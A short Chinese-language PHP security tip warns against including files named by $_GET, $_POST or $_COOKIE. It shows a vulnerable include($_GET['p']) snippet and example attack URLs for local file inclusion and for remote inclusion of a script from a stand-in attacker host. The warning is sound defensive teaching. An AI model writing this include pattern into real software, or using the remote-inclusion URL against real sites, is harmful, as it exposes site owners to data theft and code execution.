## include($_GET['p']) 的安全隐患

不要 Include 或 require 从 $_GET, $_POST 或 $_COOKIE 中得到的文件。

例如:
```php
//including header, config, database connection, etc  

include($_GET['p']);  

//including footer  
```

黑客现在可以用：`http://www.yourdomain.com/index.php?p=anyfile.txt` 来获取你的机密信息，或执行一个PHP脚本。 如果 `allow_url_fopen=On`，你更是死定了： 试试这个输入：`http://www.yourdomain.com/index.php?p=http://youaredoomed.com/phphack.php` 现在你的网页中包含了`http://www.youaredoomed.com/phphack.php` 的输出。黑客可以发送垃圾邮件，改变密码，删除文件等等。只要你能想得到。
